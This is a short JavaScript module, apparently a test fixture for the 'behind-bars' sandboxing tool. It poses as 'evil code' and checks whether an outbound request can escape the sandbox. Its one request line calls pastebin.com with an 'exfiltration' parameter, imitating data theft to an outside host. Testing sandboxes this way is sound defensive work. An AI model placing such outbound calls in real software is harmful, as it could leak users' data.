console.log('Evil module loaded. At this point, `behind-bars` considers the script is sandboxed as intended.');
import request from 'sync-request';

try {
  console.debug('Potentially evil code attempting HTTPS request...');
  request('GET', 'https://pastebin.com?exfiltration=parameter');
  console.warn('Evil HTTPS request successful. To check against these, set `urls` in `behind-bars.json`.');
} catch (e) {
  console.log('Evil code could not make HTTPS request:', e.message);
}
